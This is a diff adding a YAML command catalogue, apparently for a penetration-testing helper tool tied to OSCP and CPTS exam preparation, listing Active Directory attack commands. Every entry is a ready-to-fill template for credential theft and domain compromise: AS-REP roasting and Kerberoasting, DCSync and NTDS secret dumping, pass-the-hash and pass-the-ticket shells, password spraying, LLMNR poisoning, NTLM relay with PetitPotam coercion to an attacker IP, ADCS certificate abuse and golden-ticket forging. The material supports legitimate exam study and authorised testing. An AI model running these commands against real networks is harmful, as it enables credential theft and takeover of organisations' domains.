@@ -1,0 +1,309 @@
+category: "active-directory"
+description: "Active Directory enumeration and attacks"
+commands:
+  - name: "asrep-roast"
+    description: "AS-REP Roasting - extract hashes for users without pre-auth (user list)"
+    command: "impacket-GetNPUsers {DOMAIN}/ -usersfile {USERS_FILE} -no-pass -dc-ip {IP} -outputfile loot/asrep_hashes.txt"
+    tool: "impacket"
+    tags: ["ad", "kerberos", "asrep", "roast", "hash"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Does NOT require credentials. Works with user list."
+
+  - name: "asrep-roast-single"
+    description: "AS-REP Roasting - check a single user for no pre-auth"
+    command: "impacket-GetNPUsers {DOMAIN}/{USER} -no-pass -dc-ip {IP}"
+    tool: "impacket"
+    tags: ["ad", "kerberos", "asrep", "roast", "hash"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Quick check for one user. No creds needed."
+
+  - name: "asrep-roast-all"
+    description: "AS-REP Roasting - auto-discover vulnerable users with creds"
+    command: "impacket-GetNPUsers {DOMAIN}/{USER}:{PASSWORD} -dc-ip {IP} -request -outputfile loot/asrep_hashes.txt"
+    tool: "impacket"
+    tags: ["ad", "kerberos", "asrep", "roast", "hash", "enum"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "With valid creds, auto-finds all users with pre-auth disabled."
+
+  - name: "asrep-roast-nxc"
+    description: "AS-REP Roasting via NetExec LDAP module"
+    command: "nxc ldap {IP} -u {USER} -p {PASSWORD} --asreproast loot/asrep_hashes.txt"
+    tool: "netexec"
+    tags: ["ad", "kerberos", "asrep", "roast", "ldap"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Requires valid creds. Finds and roasts all vulnerable users."
+
+  - name: "asrep-roast-kerbrute"
+    description: "AS-REP Roasting with kerbrute (no creds, fast)"
+    command: "kerbrute userenum -d {DOMAIN} --dc {IP} {USERS_FILE} --downgrade"
+    tool: "kerbrute"
+    tags: ["ad", "kerberos", "asrep", "roast", "enum"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Discovers users AND identifies those without pre-auth in one step."
+
+  - name: "rubeus-asreproast"
+    description: "AS-REP Roasting from Windows using Rubeus"
+    command: ".\\Rubeus.exe asreproast /nowrap /outfile:asrep_hashes.txt"
+    tool: "rubeus"
+    tags: ["ad", "windows", "kerberos", "asrep", "roast"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Run from a domain-joined machine. /nowrap keeps hashes on one line."
+
+  - name: "kerberoast"
+    description: "Kerberoasting - extract TGS hashes for service accounts"
+    command: "impacket-GetUserSPNs {DOMAIN}/{USER}:{PASSWORD} -dc-ip {IP} -outputfile loot/kerberoast_hashes.txt"
+    tool: "impacket"
+    tags: ["ad", "kerberos", "kerberoast", "spn", "hash"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Requires valid domain credentials"
+
+  - name: "bloodhound-collect"
+    description: "BloodHound data collection with bloodhound-python"
+    command: "bloodhound-python -c All -u {USER} -p {PASSWORD} -d {DOMAIN} -ns {IP}"
+    tool: "bloodhound-python"
+    tags: ["ad", "bloodhound", "enum", "graph"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "sharphound-collect"
+    description: "BloodHound data collection with SharpHound.exe (from Windows)"
+    command: "Invoke-BloodHound -CollectionMethod All -Domain {DOMAIN} -ZipFileName loot.zip"
+    tool: "sharphound"
+    tags: ["ad", "bloodhound", "enum", "windows"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "powerview-trusts"
+    description: "Map domain trusts using PowerView"
+    command: "Get-DomainTrust -Domain {DOMAIN}"
+    tool: "powerview"
+    tags: ["ad", "trusts", "enum", "windows"]
+    os: "windows"
+    exam: ["cpts"]
+    notes: "Also try Get-DomainTrustMapping for full forest visibility"
+
+  - name: "powerview-users"
+    description: "Enumerate domain users with PowerView"
+    command: "Get-DomainUser -Domain {DOMAIN} | Select-Object samaccountname, description"
+    tool: "powerview"
+    tags: ["ad", "users", "enum", "windows"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "rubeus-kerberoast"
+    description: "Kerberoast from Windows using Rubeus"
+    command: ".\\Rubeus.exe kerberoast /nowrap /outfile:hashes.txt"
+    tool: "rubeus"
+    tags: ["ad", "windows", "kerberoast", "hash"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "rubeus-asktgt"
+    description: "Overpass-the-Hash: Request TGT using NTLM/RC4 hash"
+    command: ".\\Rubeus.exe asktgt /user:{USER} /rc4:{HASH} /ptt"
+    tool: "rubeus"
+    tags: ["ad", "windows", "ptt", "hash", "overpass"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Requires elevated prompt for injection (/ptt)"
+
+  - name: "mimikatz-dcsync"
+    description: "Perform DCSync from Windows"
+    command: "mimikatz.exe 'lsadump::dcsync /domain:{DOMAIN} /user:krbtgt' exit"
+    tool: "mimikatz"
+    tags: ["ad", "windows", "dcsync", "dump"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Requires DA or Replication privileges"
+
+  - name: "ldapsearch-base"
+    description: "LDAP anonymous bind - get naming contexts"
+    command: "ldapsearch -x -H ldap://{IP} -b '' -s base namingContexts"
+    tool: "ldapsearch"
+    tags: ["ad", "ldap", "recon"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "ldapsearch-users"
+    description: "LDAP search for all users"
+    command: "ldapsearch -x -H ldap://{IP} -b 'DC={DOMAIN_PART1},DC={DOMAIN_PART2}' '(objectClass=user)' sAMAccountName description memberOf"
+    tool: "ldapsearch"
+    tags: ["ad", "ldap", "users", "enum"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "nxc-ldap-users"
+    description: "LDAP user enumeration with NetExec"
+    command: "nxc ldap {IP} -u {USER} -p {PASSWORD} --users"
+    tool: "netexec"
+    tags: ["ad", "ldap", "users"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "impacket-secretsdump"
+    description: "Extract secrets from domain controller (requires DA)"
+    command: "impacket-secretsdump {DOMAIN}/{USER}:{PASSWORD}@{IP}"
+    tool: "impacket"
+    tags: ["ad", "secrets", "dump", "ntds"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Requires Domain Admin. Dumps NTDS.dit hashes"
+
+  - name: "impacket-psexec"
+    description: "PsExec-style shell via SMB"
+    command: "impacket-psexec {DOMAIN}/{USER}:{PASSWORD}@{IP}"
+    tool: "impacket"
+    tags: ["ad", "shell", "psexec", "lateral"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "impacket-wmiexec"
+    description: "WMI-based shell execution"
+    command: "impacket-wmiexec {DOMAIN}/{USER}:{PASSWORD}@{IP}"
+    tool: "impacket"
+    tags: ["ad", "shell", "wmi", "lateral"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "evil-winrm"
+    description: "WinRM shell with Evil-WinRM"
+    command: "evil-winrm -i {IP} -u {USER} -p {PASSWORD}"
+    tool: "evil-winrm"
+    tags: ["ad", "winrm", "shell"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "evil-winrm-hash"
+    description: "WinRM shell with NTLM hash (Pass-the-Hash)"
+    command: "evil-winrm -i {IP} -u {USER} -H {HASH}"
+    tool: "evil-winrm"
+    tags: ["ad", "winrm", "pth", "hash"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "kerbrute-userenum"
+    description: "Kerberos user enumeration (no creds needed)"
+    command: "kerbrute userenum -d {DOMAIN} --dc {IP} {USERS_FILE}"
+    tool: "kerbrute"
+    tags: ["ad", "kerberos", "users", "enum"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Stealthy user enumeration via Kerberos"
+
+  - name: "certipy-find"
+    description: "Enumerate ADCS (certificate services) vulnerabilities"
+    command: "certipy find -u {USER}@{DOMAIN} -p {PASSWORD} -dc-ip {IP} -vulnerable"
+    tool: "certipy"
+    tags: ["ad", "adcs", "certificates", "enum"]
+    os: "windows"
+    exam: ["cpts"]
+    notes: "ADCS abuse is increasingly common in real environments"
+
+  - name: "nxc-spray-password"
+    description: "AD password spray via SMB"
+    command: "nxc smb {IP} -u {USERS_FILE} -p '{PASSWORD}' --no-bruteforce"
+    tool: "netexec"
+    tags: ["ad", "spray", "password", "smb"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "[Warning] ALWAYS check lockout policy first!"
+
+  - name: "spray-common"
+    description: "Spray common passwords across all users"
+    command: "nxc smb {IP} -u {USERS_FILE} -p 'Welcome1!'"
+    tool: "netexec"
+    tags: ["ad", "spray", "password", "smb", "common"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Often useful when standard domain users have default passwords"
+
+  - name: "nxc-local-admin"
+    description: "Check for local admin access across network using local auth"
+    command: "nxc smb {IP_RANGE} -u {USER} -p '{PASSWORD}' --local-auth"
+    tool: "netexec"
+    tags: ["ad", "smb", "local-admin", "lateral"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "responder"
+    description: "Run Responder for LLMNR/NBT-NS/mDNS poisoning"
+    command: "sudo responder -I eth0 -dwP"
+    tool: "responder"
+    tags: ["ad", "poisoning", "llmnr", "nbt-ns", "mdns"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Requires interface name, e.g., tun0 or eth0"
+
+  - name: "ntlmrelayx-smb"
+    description: "Relay NTLM auth to SMB to execute commands"
+    command: "impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'"
+    tool: "impacket"
+    tags: ["ad", "relay", "ntlm", "smb"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Targets file should contain systems where SMB signing is disabled."
+
+  - name: "ntlmrelayx-adcs"
+    description: "Relay NTLM auth to ADCS HTTP endpoint"
+    command: "sudo impacket-ntlmrelayx -t http://{CA_IP}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+    tool: "impacket"
+    tags: ["ad", "relay", "adcs", "certificates"]
+    os: "linux"
+    exam: ["cpts"]
+    notes: "Use with petitpotam or printerbug to coerce DC auth"
+
+  - name: "petitpotam"
+    description: "Coerce MS-EFSRPC authentication to attacker IP"
+    command: "python3 PetitPotam.py {ATTACKER_IP} {IP} -u {USER} -p '{PASSWORD}'"
+    tool: "petitpotam"
+    tags: ["ad", "coerce", "auth"]
+    os: "linux"
+    exam: ["cpts"]
+
+  - name: "certipy-req"
+    description: "Request a certificate using a vulnerable template (ESC1)"
+    command: "certipy req -u {USER}@{DOMAIN} -p '{PASSWORD}' -ca {CA_NAME} -template {TEMPLATE} -upn administrator@{DOMAIN} -target {IP}"
+    tool: "certipy"
+    tags: ["ad", "adcs", "certificates", "esc1"]
+    os: "linux"
+    exam: ["cpts"]
+
+  - name: "pass-the-ticket"
+    description: "Inject a Kerberos ticket for authentication"
+    command: "export KRB5CCNAME=ticket.ccache && impacket-psexec {DOMAIN}/{USER}@{IP} -k -no-pass"
+    tool: "impacket"
+    tags: ["ad", "ptt", "ticket", "kerberos"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "golden-ticket"
+    description: "Forge a Golden Ticket using krbtgt hash"
+    command: "impacket-ticketer -nthash {KRBTGT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} Administrator"
+    tool: "impacket"
+    tags: ["ad", "ticket", "golden", "forge"]
+    os: "linux"
+    exam: ["cpts"]
+
+  - name: "impacket-getst"
+    description: "Forge inter-realm trusts or S4U2Self tickets"
+    command: "impacket-getST -spn cifs/{TRUST_DC_IP} -impersonate Administrator -dc-ip {IP} '{DOMAIN}/{USER}:{PASSWORD}'"
+    tool: "impacket"
+    tags: ["ad", "ticket", "forge", "trusts"]
+    os: "linux"
+    exam: ["cpts"]
+    notes: "Requires trusted domain context or unconstrained delegation"
+
+  - name: "nxc-trusts"
+    description: "Enumerate domain trusts via NetExec"
+    command: "nxc smb {IP} -u {USER} -p '{PASSWORD}' --trusts"
+    tool: "netexec"
+    tags: ["ad", "trusts", "smb"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
